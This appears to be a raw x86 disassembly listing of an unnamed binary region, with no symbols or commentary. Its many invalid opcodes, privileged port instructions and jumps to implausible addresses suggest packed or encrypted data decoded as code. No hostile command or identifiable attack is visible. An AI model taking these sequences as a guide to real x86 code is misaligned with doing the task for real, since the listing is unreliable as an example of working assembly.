  4037bd:	add    edi,DWORD PTR [esi]
  4037bf:	pop    ebx
  4037c0:	jmp    0xe9df3383
  4037c5:	add    edi,DWORD PTR [esi]
  4037c7:	pop    ebx
  4037c8:	jb     0x40381a
  4037ca:	inc    esi
  4037cb:	sar    bl,1
  4037cd:	mov    BYTE PTR [ebx],al
  4037cf:	mov    ds:0x9c3c6a39,eax
  4037d4:	cmp    al,0xf8
  4037d6:	jns    0x4037fe
  4037d8:	shl    esi,0xeb
  4037db:	push   edx
  4037dc:	mov    dh,0x51
  4037de:	push   edx
  4037df:	shl    BYTE PTR [esp+edi*8],1
  4037e2:	ja     0x40377d
  4037e4:	in     eax,dx
  4037e5:	add    esi,ebx
  4037e7:	iret   
  4037e8:	lea    eax,[edx+0x5c39a37a]
  4037ee:	(bad)  
  4037ef:	mov    ?,ecx
  4037f1:	inc    ebx
  4037f2:	mov    ds:0x9bfd04fb,eax
  4037f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037f9:	inc    eax
  4037fa:	ss pop ebx
  4037fc:	add    cl,ch
	...
  403826:	add    BYTE PTR [eax],al
  403828:	cmp    eax,0x2624c75b
  40382d:	pop    ebx
  40382e:	add    cl,ch
  403830:	cmp    eax,0xc4f155d0
  403835:	dec    eax
  403836:	lea    ebp,[ebp+eax*1+0x8e86a0b]
  40383d:	es cld 
  40383f:	inc    esi
  403840:	outs   dx,BYTE PTR ds:[esi]
  403841:	mov    ds:0x9c45b4ff,eax
  403846:	push   edx
  403847:	(bad)  
  403849:	and    eax,0x9bbc4108
  40384e:	jmp    DWORD PTR [esi]
  403850:	ins    DWORD PTR es:[edi],dx
  403851:	rcl    BYTE PTR [ebp-0xf],1
  403854:	les    ecx,FWORD PTR [eax+0x6a]
  403857:	jmp    0x953f93b3
  40385c:	leave  
  40385d:	fwait
  40385e:	jne    0x403861
  403860:	mov    al,0x25
  403862:	or     dh,bh
  403864:	push   cs
  403865:	inc    edi
  403866:	pop    eax
  403867:	bound  ecx,QWORD PTR [esi]
  403869:	mov    ds:0x60399403,eax
  40386e:	rcr    BYTE PTR [edi-0x68],1
  403871:	jo     0x403833
  403873:	mov    al,0x7c
  403875:	push   edx
  403876:	add    BYTE PTR [ecx-0x16ffa4c3],dl
  40387c:	je     0x403816
  40387e:	or     cl,ch
  403880:	or     al,dl
  403882:	in     al,dx
  403883:	push   0x7e
  403885:	sahf   
  403886:	push   eax
  403887:	adc    edx,ebx
  403889:	pop    edi
  40388a:	adc    DWORD PTR [ecx],ebp
	...
  4038b4:	add    BYTE PTR [eax],al
  4038b6:	cmp    ah,BYTE PTR [ebx-0x6481178e]
  4038bc:	call   DWORD PTR [edx+ebp*1]
  4038bf:	pushf  
  4038c0:	jne    0x4038a3
  4038c2:	push   ebp
  4038c3:	dec    DWORD PTR es:[esi+0xc04f4b]
  4038ca:	cmp    bl,BYTE PTR [ebx+0x5f23c2c8]
  4038d0:	mov    edx,DWORD PTR [ebp+0x1f]
  4038d3:	in     al,0x12
  4038d5:	lea    ebx,[edx-0x6d]
  4038d8:	push   eax
  4038d9:	(bad)  
  4038da:	cli    
  4038db:	outs   dx,BYTE PTR ds:[esi]
  4038dc:	push   DWORD PTR [ebp+0x23]
  4038df:	nop
  4038e0:	jne    0x4038ea
  4038e2:	jo     0x403911
  4038e4:	or     al,0x85
  4038e6:	push   edi
  4038e7:	pop    ss
  4038e8:	adc    ecx,DWORD PTR [ebx+0x453b92aa]
  4038ee:	pop    ss
  4038ef:	or     al,BYTE PTR [edi]
  4038f1:	mov    eax,0x5ed6
  4038f6:	jl     0x403891
  4038f8:	sub    al,al
  4038fa:	sub    al,0x5d
  4038fc:	sub    eax,eax
  4038fe:	push   cs
  4038ff:	popf   
  403900:	or     al,0x0
  403902:	mov    ah,bl
  403904:	in     al,dx
  403905:	sbb    DWORD PTR [ebx],0xffffff93
  403908:	push   esi
  403909:	push   eax
  40390a:	fild   WORD PTR [esi]
  40390c:	xchg   ebx,eax
  40390d:	adc    edi,esp
  40390f:	pop    esi
  403910:	clc    
  403911:	jb     0x4038a9
  403913:	fwait
  403914:	inc    DWORD PTR [ebx+0x74006212]
	...
  403942:	add    BYTE PTR [eax],al
  403944:	test   eax,0xa7087ddb
  403949:	or     DWORD PTR [edi],eax
  40394b:	sub    edx,edi
  40394d:	xor    cl,cl
  40394f:	ret    0x5e63
  403952:	cmp    DWORD PTR [ebp-0x69],0x5e
  403956:	jne    0x403962
  403958:	mov    edi,0x5700005d
  40395d:	xor    cl,cl
  40395f:	ret    0x5e83
  403962:	mov    esi,DWORD PTR [ebp+0x53]
  403965:	xlat   BYTE PTR ds:[ebx]
  403966:	inc    ebp
  403967:	cld    
  403968:	addr16 pop esi
  40396a:	add    BYTE PTR [eax],al
  40396c:	ds std 
  40396e:	dec    ebp
  40396f:	or     BYTE PTR [ebp+0x3a458696],dh
  403975:	je     0x40396c
  403977:	jne    0x4039c7
  403979:	jb     0x403970
  40397b:	jne    0x4039b3
  40397d:	adc    DWORD PTR [ecx+0x10],edx
  403980:	mov    ebx,0x65077ac3
  403985:	inc    esp
  403986:	push   ebp
  403987:	leave  
  403988:	cld    
  403989:	xchg   DWORD PTR [ebx],eax
  40398b:	or     DWORD PTR [ebx+0x39750330],0x5d
  403992:	les    ebx,FWORD PTR [esi+0x7]
  403995:	inc    esi
  403996:	pop    es
  403997:	add    ch,al
  403999:	mov    esi,0x5aee03f7
  40399e:	aas    
  40399f:	adc    BYTE PTR [ebx+0x40],ch
  4039a2:	mov    ebx,0x3843e01
  4039a7:	pop    esi
	...
  4039d0:	add    BYTE PTR [eax],al
  4039d2:	pop    es
  4039d3:	inc    esi
  4039d4:	pop    es
  4039d5:	add    BYTE PTR [ebx-0x3],dh
  4039d8:	out    0x81,al
  4039da:	cli    
  4039db:	imul   esp,esp,0xffffffff
  4039de:	mov    ecx,0x4a685bf3
  4039e3:	mov    dh,0x43
  4039e5:	add    BYTE PTR [esi-0x5e3cfdeb],ah
  4039eb:	fld    QWORD PTR [ebx]
  4039ed:	push   0x3e
  4039ef:	cs pop es
  4039f1:	push   0x3e
  4039f3:	cs pop es
  4039f5:	push   0x8003843e
  4039fa:	sub    DWORD PTR [esi],0xd32de7fc
  403a00:	add    al,0x0
  403a02:	(bad)  
  403a03:	ds lock inc eax
  403a06:	xrelease xchg DWORD PTR [edx+eax*8+0x5d8436],edi
  403a0e:	retf   
  403a0f:	pop    edx
  403a10:	sub    al,0xec
  403a12:	out    dx,al
  403a13:	add    ch,cl
  403a15:	adc    edi,DWORD PTR [esi]
  403a17:	pop    ebx
  403a18:	mov    DWORD PTR fs:[esi-0x77],eax
  403a1c:	mov    ?,ebx
  403a1e:	mov    ds,WORD PTR [eax+0x6f26effc]
  403a24:	js     0x403a2a
  403a26:	ds fs test eax,0xf4983079
  403a2d:	out    dx,eax
  403a2e:	imul   ebx,DWORD PTR es:[eax+0x4],0xbd29443e
	...
  403a5e:	add    BYTE PTR [eax],al
  403a60:	cld    
  403a61:	arpl   cx,bp
  403a63:	repnz mov edx,DWORD PTR [ebx-0x770976a4]
  403a6a:	inc    esi
  403a6b:	repz mov ds,WORD PTR [eax+0x66e1ffb4]
  403a72:	ss repz loope 0x403a52
  403a76:	lods   al,BYTE PTR ds:[esi]
  403a77:	jmp    0x403ab7
  403a79:	push   cs
  403a7a:	gs repz dec ebx
  403a7d:	xchg   edi,eax
  403a7e:	adc    ebp,ebx
  403a80:	into   
  403a81:	pop    ebx
  403a82:	jmp    0xe99b7a32
  403a87:	add    eax,DWORD PTR [edi+0xb03f19d]
  403a8d:	in     al,0xd
  403a8f:	push   esp
  403a90:	push   es
  403a91:	add    edx,DWORD PTR [eax+0x16]
  403a94:	(bad)  
  403a95:	pop    edx
  403a96:	icebp  
  403a97:	jne    0x403ad8
  403a99:	pushf  
  403a9a:	out    0x5d,al
  403a9c:	cmp    al,0x5
  403a9e:	jmp    0xc1a34e95
  403aa3:	xchg   ecx,eax
  403aa4:	sbb    DWORD PTR [eax+0x5f7cbcce],0xffffffe9
  403aab:	pop    eax
  403aac:	lds    eax,FWORD PTR [edi-0x2d29b3e7]
  403ab2:	add    bl,bl
  403ab4:	std    
  403ab5:	pop    edx
  403ab6:	clc    
  403ab7:	cmp    eax,DWORD PTR [ebx-0x64]
  403aba:	call   DWORD PTR [ebx]
  403abc:	cmp    al,BYTE PTR ds:0x62c69e00
  403ac2:	call   0x403add
	...
  403aeb:	add    BYTE PTR [eax],al
  403aed:	add    BYTE PTR [edi-0x68],cl
  403af0:	jmp    DWORD PTR [eax+0x1c005f03]
  403af6:	mov    cl,0x87
  403af8:	and    DWORD PTR [ebp+0x1582b15],0xfffffff0
  403aff:	ins    BYTE PTR es:[edi],dx
  403b00:	inc    eax
  403b01:	jmp    0x2a41482b
  403b06:	or     al,0x98
  403b08:	jne    0x403af7
  403b0a:	mov    esp,0x762ef81d
  403b0f:	xchg   edi,eax
  403b10:	add    cl,ch
  403b12:	cmp    eax,0xece96a5b
  403b17:	or     eax,0x63663e0c
  403b1c:	call   0xffd829c7
  403b21:	bound  esi,QWORD PTR [esi+0x63]
  403b24:	mov    edi,ebx
  403b26:	int3   
  403b27:	or     eax,0x93461efc
  403b2c:	call   FWORD PTR [ebp+eax*8-0x50ead68]
  403b33:	pushf  
  403b34:	or     cl,ch
  403b36:	push   ss
  403b37:	in     al,0xec
  403b39:	cdq    
  403b3a:	cmc    
  403b3b:	add    bl,BYTE PTR [eax]
  403b3d:	(bad)  
  403b3f:	pop    edx
  403b40:	clc    
  403b41:	jnp    0x403b85
  403b43:	pushf  
  403b44:	call   DWORD PTR [ebx+0x3a]
  403b47:	cwde   
  403b48:	jne    0x403b3b
  403b4a:	gs sar bh,0xd6
  403b4e:	(bad)  
  403b4f:	mov    eax,ds:0xe5c2
	...
  403b7c:	cmp    eax,0x8b008b2e
  403b81:	adc    eax,0x48d41455
  403b86:	add    BYTE PTR [ebp+0x53],dh
  403b89:	aam    0xc2
  403b8b:	adc    BYTE PTR [edi-0x76],ah
  403b8e:	jne    0x403ba0
  403b90:	cwde   
  403b91:	(bad)  
  403b93:	push   DWORD PTR [edx]
  403b95:	xchg   edi,eax
  403b96:	out    0xe6,eax
  403b98:	stos   BYTE PTR es:[edi],al
  403b99:	mov    edi,edi
  403b9b:	mov    esi,DWORD PTR [edx+0x73]
  403b9e:	and    DWORD PTR [edx],eax
  403ba0:	out    dx,al
  403ba1:	popf   
  403ba2:	adc    BYTE PTR [eax],al
  403ba4:	push   edx
  403ba5:	sbb    ah,ch
  403ba7:	adc    ebx,0xffffff8b
  403baa:	push   DWORD PTR [ebp-0x5]
  403bad:	cmp    BYTE PTR [ecx*4-0xaf791e],al
  403bb4:	repnz xchg edx,eax
  403bb6:	out    0xc3,eax
  403bb8:	push   0xa28bff8c
  403bbd:	xchg   esi,eax
  403bbe:	cmp    BYTE PTR [eax],0xe7
  403bc1:	push   cs
  403bc2:	pop    es
  403bc3:	mov    esp,DWORD PTR [edx+0x7cc80f86]
  403bc9:	pop    ebp
  403bca:	sub    eax,eax
  403bcc:	push   ds
  403bcd:	popf   
  403bce:	or     BYTE PTR [eax],al
  403bd0:	xchg   edx,eax
  403bd1:	pop    ss
  403bd2:	in     al,dx
  403bd3:	and    DWORD PTR [ebx],0xffffff8b
  403bd6:	push   DWORD PTR [ebp-0x25]
  403bd9:	cmp    BYTE PTR [edx],al
  403bdb:	(bad)  
  403bdc:	loop   0x403b6a
  403bde:	push   eax
  403bdf:	inc    DWORD PTR [eax]
	...
  403c09:	add    BYTE PTR [edx],dh
  403c0b:	xchg   edx,eax
  403c0c:	out    0x97,eax
  403c0e:	test   al,0x8b
  403c10:	dec    DWORD PTR [ebx+0x388296d2]
  403c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c17:	push   cs
  403c18:	or     BYTE PTR [edi],cl
  403c1a:	mov    al,0x1d
  403c1c:	inc    BYTE PTR [esi+0x2b02b7e3]
  403c22:	les    edi,FWORD PTR ds:[edx+0x568446c2]
  403c29:	mov    esp,DWORD PTR [edx+0x1]
  403c2c:	(bad)  
  403c2d:	cld    
  403c2e:	imul   ecx,DWORD PTR [edi+0x0],0x45ff3f6a
  403c35:	(bad)  
  403c36:	out    dx,al
  403c37:	les    esi,FWORD PTR [esi+0x8]
  403c3a:	pushw  0xfff1
  403c3d:	dec    DWORD PTR [ecx+0x9]
  403c40:	inc    esi
  403c41:	or     al,0xbd
  403c43:	lods   al,BYTE PTR ds:[esi]
  403c44:	add    esi,DWORD PTR [eax+eax*2-0x4b]
  403c48:	mov    ecx,0x5e93145
  403c4d:	sub    edi,esi
  403c4f:	retf   0x8c5
  403c52:	ds ja  0x403cd2
  403c55:	in     al,dx
  403c56:	lds    ebp,FWORD PTR [esi+0x14]
  403c59:	adc    DWORD PTR [esp+eax*4+0x76],0x4
  403c5e:	test   DWORD PTR [ecx-0x1],0xffb700ff
  403c65:	(bad)  
  403c66:	jae    0x403ce4
  403c68:	fcmovnbe st,st(0)
  403c6a:	repnz sbb al,0xf0
  403c6d:	or     eax,DWORD PTR [eax]
	...
  403c97:	add    dh,bh
  403c99:	into   
  403c9a:	cld    
  403c9b:	mov    cl,BYTE PTR [ebx+0x3e02c8b4]
  403ca1:	test   BYTE PTR [ebx],al
  403ca3:	add    ch,ah
  403ca5:	mov    ds,WORD PTR [ebp+0x1]
  403ca8:	leave  
  403ca9:	out    dx,al
  403caa:	(bad)  
  403cab:	dec    BYTE PTR [ebx+0x7c]
  403cae:	fstp   TBYTE PTR ds:0xc9f064ba
  403cb4:	jl     0x403c45
  403cb6:	add    edx,DWORD PTR [ebp-0x4b]
  403cb9:	addr16 test ah,al
  403cbc:	mov    ds:0x4a757cf5,al
  403cc1:	fiadd  DWORD PTR [ebx]
  403cc3:	(bad)  
  403cc4:	sti    
  403cc5:	pop    edx
  403cc6:	in     eax,0x54
  403cc8:	mov    DWORD PTR [edi],ecx
  403cca:	stc    
  403ccb:	push   ebp
  403ccc:	or     DWORD PTR [edi],0x8604dbe1
  403cd2:	jmp    0x3ddb81da
  403cd7:	push   es
  403cd8:	mov    ebp,0xeb04bd17
  403cdd:	pop    ebp
  403cde:	add    al,ah
  403ce0:	clc    
  403ce1:	mov    ds:0xe23e00ab,eax
  403ce6:	sub    al,0xf0
  403ce8:	cmp    eax,0x2e48d08b
  403ced:	adc    BYTE PTR [edx-0x16a4c054],bh
  403cf3:	add    edx,DWORD PTR [eax+0x3e00aba2]
  403cf9:	cs jb  0x403cdc
	...
  403d24:	add    BYTE PTR [eax],al
  403d26:	mov    edi,0x19eef19f
  403d2b:	xchg   ebp,eax
  403d2c:	sbb    bl,BYTE PTR [ebx]
  403d2e:	cmc    
  403d2f:	add    ecx,ebp
  403d31:	pop    ecx
  403d32:	ds add ebx,ebp
  403d35:	pop    ecx
  403d36:	ds add edx,ebp
  403d39:	pop    ebx
  403d3a:	ds pop ebx
  403d3c:	jmp    0xf54f2f04
  403d41:	fucomi st,st(6)
  403d43:	test   ecx,ebp
  403d45:	add    esi,DWORD PTR [edi+0x5244351e]
  403d4b:	sub    BYTE PTR [esi],ch
  403d4d:	jns    0x403d95
  403d4f:	adc    esp,0xffffffed
  403d52:	leave  
  403d53:	xchg   esp,eax
  403d54:	es dec ecx
  403d56:	(bad)  
  403d57:	pop    ebx
  403d58:	jmp    0xb5207b60
  403d5d:	sti    
  403d5e:	les    ebp,FWORD PTR [ecx+0x74]
  403d61:	dec    ecx
  403d62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d63:	sub    edx,DWORD PTR [ecx+0x5b3e83]
  403d69:	jmp    0xeeb91c2c
  403d6e:	mov    al,ds:0x6e65094
  403d73:	arpl   di,di
  403d75:	cmp    edi,DWORD PTR [esi]
  403d77:	fdivr  DWORD PTR [ebp-0x2f]
  403d7a:	cmp    eax,0x952a030e
  403d7f:	jae    0x403d80
  403d81:	cmp    al,0x5a
  403d83:	out    0x85,al
  403d85:	inc    ecx
  403d86:	push   ecx
  403d87:	xchg   esp,eax
  403d88:	call   FWORD PTR [ecx]
	...
  403db2:	add    BYTE PTR [eax],al
  403db4:	imul   ecx,DWORD PTR [esi],0x93eac1fc
  403dba:	jmp    DWORD PTR [esi-0x148b2bbc]
  403dc0:	fs (bad) 
  403dc2:	call   FWORD PTR [esi+ebp*1]
  403dc5:	and    DWORD PTR [ebx-0x74a4c281],0xffffffaa
  403dcc:	je     0x403d70
  403dce:	ret    0x3df1
  403dd1:	mov    eax,DWORD PTR cs:[ebp+0x6ef89ebc]
  403dd8:	xchg   esi,eax
  403dd9:	addr16 call 0xffd45268
  403ddf:	jo     0x403e57
  403de1:	xchg   ebx,eax
  403de2:	(bad)  
  403de3:	lods   al,BYTE PTR ds:[esi]
  403de4:	jmp    0x3e293e43
  403de9:	xchg   esp,eax
  403dea:	jne    0x403de1
  403dec:	add    eax,0xd03efdd0
  403df1:	fist   WORD PTR [ebp-0x1b]
  403df4:	push   esp
  403df5:	imul   ebp,DWORD PTR [edx-0x17],0x9cff5b77
  403dfc:	fst    DWORD PTR [ebx+0xdd02175]
  403e02:	or     BYTE PTR [esi],dl
  403e04:	ss addr16 (bad) 
  403e07:	mov    ebx,0xc2a241
  403e0c:	scas   eax,DWORD PTR es:[edi]
  403e0d:	push   edi
  403e0e:	push   ebp
  403e0f:	mov    esi,DWORD PTR [ebx]
  403e11:	fld    st(4)
  403e13:	clc    
  403e14:	push   0xf823
	...
  403e41:	add    BYTE PTR [edi+0x5ac70057],ah
  403e47:	mov    eax,DWORD PTR [eax]
  403e49:	add    BYTE PTR [edi+0x5f558b57],dl
  403e4f:	adc    dl,BYTE PTR [edx]
  403e51:	lea    ebx,[edx]
  403e53:	xchg   DWORD PTR [eax+0x6a],edx
  403e56:	push   esi
  403e57:	xchg   BYTE PTR [ebp-0x4],dh
  403e5a:	mov    al,ds:0x1afff80b
  403e5f:	xchg   edi,eax
  403e60:	(bad)  
  403e61:	push   edx
  403e62:	imul   edx,DWORD PTR [edx],0x45
  403e65:	clc    
  403e66:	mov    ds,WORD PTR [eax+0x120a0004]
  403e6c:	in     al,dx
  403e6d:	push   0x26
  403e6f:	adc    al,BYTE PTR [ebp+0xc]
  403e72:	ja     0x403df4
  403e74:	jne    0x403e7e
  403e76:	iret   
  403e77:	dec    esp
  403e78:	cld    
  403e79:	jmp    DWORD PTR [eax+0x2708c2d6]
  403e7f:	sub    cl,BYTE PTR [ebx-0x729cc214]
  403e85:	inc    ebp
  403e86:	adc    ebp,DWORD PTR [edi]
  403e88:	push   DWORD PTR [ebp+0xf]
  403e8b:	mov    bh,0x1e
  403e8d:	cld    
  403e8e:	nop
  403e8f:	or     cl,0xc2
  403e92:	fistp  WORD PTR [esi+0x55]
  403e95:	mov    edx,DWORD PTR [ebx-0x28f38224]
  403e9b:	or     dl,BYTE PTR [ebx+eax*4]
  403e9e:	xchg   edx,eax
  403e9f:	outs   dx,BYTE PTR ds:[esi]
  403ea0:	add    BYTE PTR [ecx+esi*8+0x7f],dh
  403ea4:	jne    0x403eb6
	...
  403ece:	add    BYTE PTR [eax],al
  403ed0:	and    BYTE PTR [edx],cl
  403ed2:	or     al,0xff
  403ed4:	stos   BYTE PTR es:[edi],al
  403ed5:	xchg   esi,eax
  403ed6:	out    0xfd,eax
  403ed8:	ds ins DWORD PTR es:[edi],dx
  403eda:	in     eax,dx
  403edb:	inc    DWORD PTR [edi+0x13000046]
  403ee1:	or     eax,0xb42bffe0
  403ee6:	in     al,dx
  403ee7:	jne    0x403f2f
  403ee9:	pop    esp
  403eea:	mov    al,0xff
  403eec:	xchg   ecx,eax
  403eed:	add    DWORD PTR [eax+0x77842e7d],0x2fbd14
  403ef7:	add    dl,dh
  403ef9:	jns    0x403ee7
  403efb:	jne    0x403f4b
  403efd:	mov    eax,ds:0x4f690c76
  403f02:	cld    
  403f03:	out    0xa9,eax
  403f05:	shr    esp,1
  403f07:	inc    DWORD PTR [edi-0x1500003a]
  403f0d:	cld    
  403f0e:	fiadd  WORD PTR [ebx+0x740387cb]
  403f14:	xor    al,0xf1
  403f16:	jbe    0x403f24
  403f18:	es fiadd WORD PTR ss:[eax]
  403f1c:	fld    QWORD PTR ds:[ecx]
  403f1f:	sub    edi,esi
  403f21:	jae    0x403f10
  403f23:	jne    0x403f57
  403f25:	adc    DWORD PTR [esi+0x8],esi
  403f28:	es push ebp
  403f2a:	in     al,dx
  403f2b:	call   DWORD PTR [ecx]
  403f2d:	mov    ebx,0xcf3e08c1
  403f32:	js     0x403f20
	...
  403f5c:	add    BYTE PTR [eax],al
  403f5e:	add    DWORD PTR [edi+0x2921e7fb],esp
  403f64:	in     al,dx
  403f65:	dec    DWORD PTR [esi+0x2967fb9e]
  403f6b:	int3   
  403f6c:	inc    edx
  403f6d:	add    cl,ah
  403f6f:	(bad)  
  403f70:	sti    
  403f71:	out    0x4d,eax
  403f73:	dec    ecx
  403f74:	in     al,dx
  403f75:	jmp    DWORD PTR [esp+eax*4-0x14]
  403f79:	jne    0x403fb1
  403f7b:	pop    ebx
  403f7c:	adc    DWORD PTR [edi-0x3f],edx
  403f7f:	xchg   ecx,eax
  403f80:	push   ds
  403f81:	pop    ecx
  403f82:	cmp    al,0xe0
  403f84:	lods   al,BYTE PTR ds:[esi]
  403f85:	inc    DWORD PTR [ecx]
  403f87:	xchg   edx,eax
  403f88:	xchg   esp,eax
  403f89:	sti    
  403f8a:	mov    eax,ds:0xa1ec0635
  403f8f:	add    al,0xeb
  403f91:	jle    0x403f96
  403f93:	imul   ebx,DWORD PTR [ecx+0x1630bec],0x3e
  403f9a:	mov    DWORD PTR [ecx-0x6388b31a],edx
  403fa0:	in     eax,dx
  403fa1:	add    edx,DWORD PTR [ebx]
  403fa3:	out    0xc5,al
  403fa5:	xchg   DWORD PTR [edx-0x72],edi
  403fa8:	into   
  403fa9:	jno    0x403fe1
  403fab:	sbb    DWORD PTR [ecx],0xffffffee
  403fae:	popa   
  403faf:	xchg   ecx,eax
  403fb0:	adc    al,BYTE PTR [ecx+0x4a]
  403fb3:	in     al,0x2c
  403fb5:	call   0xfc1d5777
  403fba:	xlat   BYTE PTR ds:[ebx]
  403fbb:	pop    edx
  403fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fbd:	jno    0x403ff1
  403fbf:	xchg   edx,eax
  403fc0:	adc    al,0xfc
	...
  403fea:	add    BYTE PTR [eax],al
  403fec:	and    DWORD PTR [ebx+edx*4-0x15],ebx
  403ff0:	xor    DWORD PTR [ecx+0x729e814],edx
  403ff6:	icebp  
  403ff7:	fstp   TBYTE PTR ds:0x19eb7e90
  403ffd:	pop    es
  403ffe:	loope  0x403fdb
  404000:	dec    edx
  404001:	(bad)  
  404002:	outs   dx,BYTE PTR ds:[esi]
  404003:	jmp    0x403fba
  404005:	push   ss
  404006:	gs mov ebp,0x50e963fc
  40400c:	lds    edi,FWORD PTR [edi+0x6a]
  40400f:	shr    dl,0x98
  404012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404013:	out    dx,eax
  404014:	ds pop ebx
  404016:	jmp    0x3d56f31e
  40401b:	push   esp
  40401c:	fld    DWORD PTR [esi]
  40401e:	add    cl,ah
  404020:	cmc    
  404021:	cmp    esi,ebp
  404023:	jmp    0xa2011665
  404028:	es nop
  40402a:	jne    0x40401d
  40402c:	xchg   ebp,eax
  40402d:	xchg   ebp,eax
  40402e:	stc    
  40402f:	push   ss
  404030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404031:	loop   0x404078
  404033:	adc    DWORD PTR [ebp-0x7aee03fa],edx
  404039:	jg     0x40403b
  40403b:	jmp    0xdfb510d8
  404040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404041:	push   es
  404042:	clc    
  404043:	cdq    
  404044:	jmp    0x4040a0
  404046:	call   0x9b7fa3
  40404b:	jo     0x40404b
  40404d:	xchg   bh,bh
  40404f:	pop    esp
	...
  404078:	add    BYTE PTR [eax],al
  40407a:	sbb    bx,0xffbd
  40407e:	cmp    eax,0x623cff5b
  404083:	js     0x404060
  404085:	ret    0x9064
  404088:	mov    ebp,DWORD PTR [esi+ecx*2]
  40408b:	pusha  
  40408c:	enter  0x6db6,0x2b
  404090:	call   FWORD PTR [edx+eax*2]
  404093:	js     0x404027
  404095:	lahf   
  404096:	and    al,0x90
  404098:	leave  
  404099:	stos   DWORD PTR es:[edi],eax
  40409a:	xor    DWORD PTR [eax-0x23ee9dac],edx
  4040a0:	les    edi,FWORD PTR [ecx-0x4]
  4040a3:	adc    eax,0x5b3de9f4
  4040a8:	add    BYTE PTR [esi+edi*2-0x71],ah
  4040ac:	push   eax
  4040ad:	outs   dx,BYTE PTR ds:[esi]
  4040ae:	mov    fs,WORD PTR [ebx-0x18]
  4040b1:	sub    esi,esp
  4040b3:	pop    edx
  4040b4:	add    BYTE PTR [ebp+edi*8+0x12],ah
  4040b8:	dec    ebp
  4040b9:	push   esi
  4040ba:	outs   dx,BYTE PTR ds:[esi]
  4040bb:	arpl   ax,bp
  4040bd:	jne    0x404099
  4040bf:	(bad)  
  4040c0:	inc    DWORD PTR [eax]
  4040c2:	outs   dx,BYTE PTR ds:[esi]
  4040c3:	sbb    edi,eax
  4040c5:	sbb    DWORD PTR [edx+0x3b720483],0xffffffd8
  4040cc:	ins    DWORD PTR es:[edi],dx
  4040cd:	clc    
  4040ce:	jecxz  0x404054
  4040d0:	jne    0x4040ce
  4040d2:	das    
  4040d3:	add    eax,0x90a700ec
  4040d8:	mov    edi,0x75849574
  4040dd:	clc    
	...
  404106:	add    BYTE PTR [eax],al
  404108:	out    0x2d,eax
  40410a:	add    al,ch
  40410c:	xchg   esi,eax
  40410d:	pop    edx
  40410e:	add    BYTE PTR [eax],al
  404110:	test   al,0xd3
  404112:	not    eax
  404114:	push   ds
  404115:	sbb    esi,esp
  404117:	call   DWORD PTR [edx]
  404119:	js     0x404103
  40411b:	imul   edx,DWORD PTR [bp+0x0],0xffffffeb
  404120:	jno    0x4040a4
  404122:	jne    0x40412c
  404124:	jg     0x404155
  404126:	sti    
  404127:	(bad)  
  404128:	js     0x404197
  40412a:	ror    cl,0x95
  40412d:	pop    edx
  40412e:	add    bl,ch
  404130:	popa   
  404131:	outs   dx,BYTE PTR ds:[esi]
  404132:	ror    cl,0xa5
  404135:	pop    edx
  404136:	add    BYTE PTR [edx+0x55],ch
  404139:	sub    eax,0x8f22fffc
  40413e:	out    0x4,eax
  404140:	fiadd  WORD PTR [edi+edi*8+0x18762c7]
  404147:	add    BYTE PTR [edi],dl
  404149:	pop    ebx
  40414a:	lea    eax,[ebp-0x59]
  40414d:	daa    
  40414e:	push   DWORD PTR [ebp+0xf]
  404151:	mov    bl,0xfa
  404153:	sti    
  404154:	mov    BYTE PTR [ebx+eax*4+0x7457877d],al
  40415b:	adc    cl,BYTE PTR [eax]
  40415d:	sar    DWORD PTR [ebx],cl
  40415f:	inc    ebp
  404160:	xchg   ebx,eax
  404161:	inc    BYTE PTR [esi]
  404163:	mov    eax,0x3833e
  404168:	sbb    DWORD PTR ds:[edx],eax
  40416b:	sub    eax,DWORD PTR [eax]
	...
  404195:	add    dh,bh
  404197:	sub    DWORD PTR [esi],eax
  404199:	sub    edi,esi
  40419b:	dec    ebx
  40419c:	mov    BYTE PTR [esi+edi*1],0xef
  4041a0:	jl     0x40418e
  4041a2:	mov    ebp,0x7b8dec38
  4041a7:	cmp    BYTE PTR [edi+edi*8+0x33],dl
  4041ab:	mov    ebx,ds
  4041ad:	sbb    ah,BYTE PTR [ebx+0x7e850384]
  4041b3:	in     al,dx
  4041b4:	sbb    al,0xff
  4041b6:	sub    ecx,DWORD PTR [ebx+ebx*8-0x17726912]
  4041bd:	mov    ebx,edi
  4041bf:	mov    ebp,eax
  4041c1:	jne    0x40414d
  4041c3:	pop    esp
  4041c4:	in     eax,0xeb
  4041c6:	ds test ah,bh
  4041c9:	mov    edi,0x75e887f2
  4041ce:	inc    edx
  4041cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041d0:	outs   dx,BYTE PTR ds:[esi]
  4041d1:	clc    
  4041d2:	push   cs
  4041d3:	pushf  
  4041d4:	or     edi,DWORD PTR cs:[esi]
  4041d7:	test   al,ch
  4041d9:	jne    0x404235
  4041db:	lods   al,BYTE PTR ds:[esi]
  4041dc:	shr    bl,cl
  4041de:	ds test al,ch
  4041e1:	jne    0x404219
  4041e3:	pushf  
  4041e4:	sar    dl,cl
  4041e6:	inc    ecx
  4041e7:	mov    ch,0xba
  4041e9:	ret    0x8446
  4041ec:	dec    esi
  4041ed:	mov    esp,DWORD PTR [edx]
  4041ef:	add    DWORD PTR [edi-0x33667218],edi
  4041f5:	lea    edi,[ebx-0x28]
  4041f8:	push   ebx
  4041f9:	inc    DWORD PTR [eax]
	...
  404223:	add    BYTE PTR [ebx+0x22cadb8c],dl
  404229:	test   BYTE PTR [ebx],al
  40422b:	test   esi,edi
  40422d:	lods   al,BYTE PTR ds:[esi]
  40422e:	jnp    0x4041e7
  404230:	ds pop ebx
  404232:	jmp    0xf1483b3a
  404237:	fcmovnbe st,st(4)
  404239:	xchg   edx,eax
  40423a:	push   esi
  40423b:	call   0xe89559f7
  404240:	imul   ecx,DWORD PTR [edi+0x5ae57851],0xffffffe9
  404247:	cld    
  404248:	xchg   ecx,eax
  404249:	pop    ebp
  40424a:	ins    DWORD PTR es:[edi],dx
  40424b:	xchg   DWORD PTR [esi],edi
  40424d:	pop    ebx
  40424e:	jmp    0x26cbbdcd
  404253:	outs   dx,BYTE PTR ds:[esi]
  404254:	mov    dl,0x82
  404256:	jnp    0x40425c
